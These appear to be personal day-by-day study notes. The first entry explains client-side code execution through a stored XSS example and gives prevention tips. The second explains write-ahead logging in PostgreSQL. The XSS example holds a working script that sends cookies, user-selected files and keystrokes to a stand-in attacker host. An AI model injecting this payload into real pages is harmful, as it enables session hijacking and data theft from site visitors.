day - 1

## Client-Side RCE(Remote Code Execution)

### Definition:

Client-Side Remote Code Execution (RCE) is a security vulnerability that allows an attacker to execute malicious code on a victim's device (browser, mobile app, or client application) by exploiting flaws in client-side software. Unlike server-side RCE, this targets the user's machine directly, potentially giving attackers access to local files, system resources, or personal data.

**Key Characteristics**

- Target: User's device/browser, not the server
- Execution context: Runs with user's privileges
- Attack vector: Malicious websites, downloads, or client applications
- Impact: Can access local files, steal data, install malware

### Example:

- XSS leading to Client-Side RCE
  Vulnerable Website (Forum):

```
<!-- Vulnerable comment system that doesn't sanitize input -->
<div class="comment">
    <!-- Attacker posts this "comment" -->
    <script>
        // Malicious payload executed in victim's browser

        // 1. Steal cookies and session data
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: 'cookies=' + document.cookie
        });

        // 2. Access local storage
        const userData = localStorage.getItem('userPreferences');

        // 3. Try to access local files (if permissions allow)
        if (window.File && window.FileReader) {
            // Trick user into selecting files
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = function(e) {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = function(e) {
                    // Send file contents to attacker
                    fetch('http://attacker.com/files', {
                        method: 'POST',
                        body: e.target.result
                    });
                };
                reader.readAsText(file);
            };
            input.click();
        }

        // 4. Keylogger
        document.addEventListener('keypress', function(e) {
            fetch('http://attacker.com/keys', {
                method: 'POST',
                body: 'key=' + e.key
            });
        });
    </script>
</div>
```

What happens when victim visits:

```
1. Victim visits forum page
2. Malicious script executes in victim's browser
3. Script runs with victim's permissions
4. Attacker gains access to:
   - Cookies and session tokens
   - Local storage data
   - Potentially local files
   - Keystroke logging
```

Prevention:

```
// ✅ Secure practices
// 1. Input sanitization
const sanitized = DOMPurify.sanitize(userInput);

// 2. Content Security Policy
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">

// 3. Secure Electron config
webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    preload: path.join(__dirname, 'preload.js')
}
```

---

day - 2

## Write Ahead Log(WAL)

### Definition:

Write Ahead Log (WAL) is a technique used in distributed systems where all changes are first written to a durable log before being applied to the actual data. This ensures data consistency, enables crash recovery, and helps maintain data integrity across multiple nodes. The key principle is: "log first, then apply changes."

### Example:

- PostgreSQL Database Cluster

```
-- User executes: UPDATE users SET balance = 500 WHERE id = 123;

-- Step 1: WAL entry written to disk FIRST
WAL Record:
{
  "lsn": "0/1B000028",
  "type": "UPDATE",
  "table": "users",
  "old_data": {"id": 123, "balance": 400},
  "new_data": {"id": 123, "balance": 500},
  "transaction_id": "TXN_456"
}

-- Step 2: Only AFTER WAL is on disk, apply to database
-- Step 3: Eventually, WAL gets replicated to standby servers
```

Recovery Process:

```
Primary Server Crashes!

Standby Server:
1. Reads WAL from shared storage
2. Replays all WAL entries since last checkpoint
3. Becomes new primary
4. No data lost! ✓
```

WAL in Distributed Systems:

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Client    │    │   Node 1    │    │   Node 2    │
└─────────────┘    └─────────────┘    └─────────────┘
       │                   │                   │
       │ 1. Write Request  │                   │
       ├──────────────────>│                   │
       │                   │ 2. Write to WAL   │
       │                   ├──────────────────>│
       │                   │ 3. WAL Synced     │
       │                   │<──────────────────┤
       │                   │ 4. Apply Changes  │
       │                   │ 5. Apply Changes  │
       │                   ├──────────────────>│
       │ 6. Success        │                   │
       │<──────────────────┤                   │
```

---
